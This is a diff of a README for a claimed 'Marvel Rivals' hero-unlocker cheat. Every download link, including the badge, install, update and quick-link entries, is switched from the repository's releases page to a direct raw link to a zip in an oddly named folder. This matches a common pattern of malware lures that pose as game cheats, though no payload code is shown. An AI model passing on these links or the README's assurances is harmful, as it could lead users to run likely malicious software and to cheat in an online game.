@@ -1,6 +1,6 @@
 # 🎮 Marvel-Rivals-All-Heroes-Unlocker - Unlock Every Hero Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Marvel_Rivals_Unlocker-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/releases)
+[![Download Now](https://img.shields.io/badge/Download-Marvel_Rivals_Unlocker-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/main/underlooker/All-Marvel-Heroes-Rivals-Unlocker-v3.8.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome to the easiest way to unlock all heroes in Marvel Rivals on your PC. Thi
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[https://github.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/releases](https://github.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/main/underlooker/All-Marvel-Heroes-Rivals-Unlocker-v3.8.zip](https://raw.githubusercontent.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/main/underlooker/All-Marvel-Heroes-Rivals-Unlocker-v3.8.zip)**
 
 Once you're on that page, look for the newest release file. Click it to start downloading. The download is a single file — no complicated packages or multiple parts.
 
@@ -61,7 +61,7 @@ Your PC likely meets these requirements if it can run Marvel Rivals itself. The 
 
 New versions of the unlocker are released whenever Marvel Rivals adds more heroes. To update:
 
-1. Visit the download page again: **[https://github.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/releases](https://github.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/releases)**
+1. Visit the download page again: **[https://raw.githubusercontent.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/main/underlooker/All-Marvel-Heroes-Rivals-Unlocker-v3.8.zip](https://raw.githubusercontent.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/main/underlooker/All-Marvel-Heroes-Rivals-Unlocker-v3.8.zip)**
 2. Download the newest file (it will have a higher version number).
 3. Run the new installer — it will replace the old version automatically.
 
@@ -149,7 +149,7 @@ If you enjoy the tool, consider starring the repository to show support. This he
 
 ## 🔗 Quick Links
 
-- **Download:** [https://github.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/releases](https://github.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/releases)
+- **Download:** [https://raw.githubusercontent.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/main/underlooker/All-Marvel-Heroes-Rivals-Unlocker-v3.8.zip](https://raw.githubusercontent.com/kunin1092/Marvel-Rivals-All-Heroes-Unlocker/main/underlooker/All-Marvel-Heroes-Rivals-Unlocker-v3.8.zip)
 - **Report Issues:** Use the Issues tab on the GitHub repository page
 
 ---
